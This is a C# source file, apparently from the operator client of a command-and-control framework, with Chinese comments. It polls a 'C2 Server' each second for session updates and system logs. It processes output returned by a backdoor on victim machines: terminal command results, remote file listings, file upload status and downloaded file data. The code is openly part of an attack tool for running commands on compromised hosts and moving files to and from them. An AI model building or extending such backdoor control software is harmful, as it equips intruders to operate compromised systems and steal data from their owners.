using System;
using System.Text;
using System.Windows;
using Newtonsoft.Json;
using System.Threading;
using System.Data.SQLite;
using System.Collections.Generic;
using System.Collections.ObjectModel;

// 数据更新
namespace Client
{
    public class Update
    {
        public static bool threadClose = false;

        // 获取新数据列表
        public static void GetNewDataList(SessionController sessionController)
        {
            while (true)
            {
                Dictionary<string, string> postParameter = new Dictionary<string, string> { };
                ObservableCollection<NewData> newDataList = new HttpRequest("?packageName=Public&structName=Update&funcName=GetNewDataList", postParameter).GetListRequest<NewData>();
                if (newDataList == null)
                {
                    MessageBox.Show("与 C2 Server 断开连接，请重新登录。", "警告", MessageBoxButton.OK, MessageBoxImage.Warning);
                    return;
                }
                foreach (NewData newData in newDataList)
                {
                    ProcessNewData(newData, sessionController);
                }

                // 更新待定会话数量
                string pendingNum = "0";
                try
                {
                    using (SQLiteConnection conn = new SQLiteConnection(@"Data Source = config\client.db"))
                    {
                        conn.Open();
                        string sql = "select count(*) from PendingSessionInfo where pending=\'true\'";
                        using (SQLiteCommand sqlCommand = new SQLiteCommand(sql, conn))
                        {
                            using (SQLiteDataReader dataReader = sqlCommand.ExecuteReader())
                            {
                                while (dataReader.Read())
                                {
                                    pendingNum = dataReader["count(*)"].ToString();
                                }
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Application.Current.Dispatcher.BeginInvoke(new Action(() =>
                    {
                        MessageBox.Show(ex.Message, "错误", MessageBoxButton.OK, MessageBoxImage.Error);
                    }));
                }
                Application.Current.Dispatcher.BeginInvoke(new Action(() =>
                {
                    sessionController.pendingSessionNumber.Text = pendingNum;
                }));

                Thread.Sleep(1000);
                if (threadClose)
                {
                    break;
                }
            }
        }

        // 处理新数据
        public static void ProcessNewData(NewData newData, SessionController sessionController)
        {
            switch (newData.dataType)
            {
                // 系统日志
                case "SystemLog":
                    new Thread(() => WindowsNotice.SystemLogNotice(newData)).Start();
                    break;
                // 告警
                case "Alarm":
                    Application.Current.Dispatcher.BeginInvoke(new Action(() =>
                    {
                        sessionController.alarm.Visibility = Visibility.Visible;
                    }));
                    break;
                // 添加待定会话信息
                case "AddPendingSessionInfo":
                    PendingSession.AddPendingSessionInfo(JsonConvert.DeserializeObject<PendingSessionInfo>(newData.content));
                    break;
                // 添加正式上线会话信息
                case "AddSessionInfo":
                    Session.AddSessionInfo(JsonConvert.DeserializeObject<SessionInfo>(newData.content));
                    break;
                // 处理命令输出
                case "CommandOutput":
                    try
                    {
                        string outputData;
                        Dictionary<string, string> commandOutputInfo = JsonConvert.DeserializeObject<Dictionary<string, string>>(newData.content);
                        switch (commandOutputInfo["scriptType"])
                        {
                            case "Terminal":
                                outputData = Encoding.GetEncoding("GBK").GetString(Convert.FromBase64String(commandOutputInfo["outputDataBase64"]));
                                Application.Current.Dispatcher.BeginInvoke(new Action(() =>
                                {
                                    Terminal.UpdateTerminalHistory(commandOutputInfo["id"], commandOutputInfo["sid"], outputData, "update TerminalHistory set command=@command where id=@id", sessionController);
                                }));
                                break;
                            case "GetFileInfoList":
                                outputData = Encoding.GetEncoding("GBK").GetString(Convert.FromBase64String(commandOutputInfo["outputDataBase64"]));
                                if (outputData == "0")
                                {
                                    new Thread(() => WindowsNotice.SystemLogNotice(new NewData() { username = "C2 Server", content = "路径不存在" })).Start();
                                    break;
                                }
                                Application.Current.Dispatcher.BeginInvoke(new Action(() =>
                                {
                                    FileManager.UpdateDatabaseFileInfo(commandOutputInfo["sid"], outputData, sessionController);
                                }));
                                break;
                            case "ZeroOrOne":
                                outputData = Encoding.GetEncoding("GBK").GetString(Convert.FromBase64String(commandOutputInfo["outputDataBase64"]));
                                if (outputData == "1")
                                {
                                    new Thread(() => WindowsNotice.SystemLogNotice(new NewData() { username = "C2 Server", content = commandOutputInfo["commandDetail"] + "成功" })).Start();
                                }
                                else
                                {
                                    new Thread(() => WindowsNotice.SystemLogNotice(new NewData() { username = "C2 Server", content = commandOutputInfo["commandDetail"] + "失败" })).Start();
                                }
                                break;
                            case "UploadFile":
                                outputData = Encoding.GetEncoding("GBK").GetString(Convert.FromBase64String(commandOutputInfo["outputDataBase64"]));
                                if (outputData == "1")
                                {
                                    UploadFile.threadPassivePauseList[commandOutputInfo["uploadId"]] = false;
                                }
                                else
                                {
                                    new Thread(() => WindowsNotice.SystemLogNotice(new NewData() { username = "C2 Server", content = commandOutputInfo["commandDetail"] + "失败" })).Start();
                                    UploadFile.threadList[commandOutputInfo["uploadId"]].Abort();
                                }
                                break;
                            case "DownloadFile":
                                byte[] outputDataBin = Convert.FromBase64String(commandOutputInfo["outputDataBase64"]);
                                if (outputDataBin.Length > 0)
                                {
                                    DownloadFile.currentDownloadDataList[commandOutputInfo["downloadId"]] = outputDataBin;
                                }
                                else
                                {
                                    new Thread(() => WindowsNotice.SystemLogNotice(new NewData() { username = "C2 Server", content = commandOutputInfo["commandDetail"] + "结束" })).Start();
                                    DownloadFile.threadList[commandOutputInfo["downloadId"]].Abort();
                                }
                                break;
                        }
                    }
                    catch (Exception ex)
                    {
                        Application.Current.Dispatcher.BeginInvoke(new Action(() =>
                        {
                            MessageBox.Show("后门输出数据无法处理\n" + ex.Message, "错误", MessageBoxButton.OK, MessageBoxImage.Error);
                        }));
                    }
                    break;
            }
        }
    }
}